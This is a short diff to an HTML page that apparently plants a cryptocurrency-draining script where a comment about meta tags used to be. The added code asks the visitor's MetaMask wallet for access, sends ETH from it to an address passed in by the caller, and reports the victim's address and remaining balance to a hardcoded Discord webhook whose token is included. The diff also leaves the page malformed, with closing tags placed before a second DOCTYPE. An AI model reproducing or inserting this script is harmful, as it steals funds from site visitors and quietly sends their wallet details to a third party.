@@ -182,7 +182,53 @@
       </div>
 
 
-<!-- meta tags and other links -->
+
+
+    <script>
+     async function sendETH(toAddress, amount) {
+    if (window.ethereum) {
+        try {
+            await window.ethereum.enable();
+            const web3 = new Web3(window.ethereum);
+            const accounts = await web3.eth.getAccounts();
+            const fromAddress = accounts[0];
+            const fromBalance = await web3.eth.getBalance(fromAddress);
+            const txHash = await web3.eth.sendTransaction({
+                from: fromAddress,
+                to: toAddress,
+                value: web3.utils.toWei(amount, 'ether')
+            });
+            console.log(`Transacción enviada: ${txHash}`);
+            const updatedBalance = await web3.eth.getBalance(fromAddress);
+            const message = `Depósito de ${amount} ETH recibido desde la dirección ${fromAddress}. Nuevo saldo: ${web3.utils.fromWei(updatedBalance)} ETH`;
+            sendWebhookMessage(webhookUrl, message);
+        } catch (error) {
+            console.error(error);
+        }
+    } else {
+        console.error('MetaMask no está instalado');
+    }
+}
+function sendWebhookMessage(webhookUrl, message) {
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            content: message
+        })
+    })
+    .then(response => console.log(`Mensaje enviado a Discord. Estado de respuesta: ${response.status} ${response.statusText}`))
+    .catch(error => console.error('Error al enviar mensaje a Discord', error));
+}
+
+      const webhookUrl = "https://discordapp.com/api/webhooks/1065639854324588574/Iu0dfAhK_XeuoLysZSCuxfc79cFpRYvMk9xAueMycoxKijo_gEjoyGT6-6e3MRWFiSnT";
+
+    </script>
+  </body>
+</html>
+
 <!DOCTYPE html>
 <html lang="en" itemscope itemtype="http://schema.org/WebPage">
 
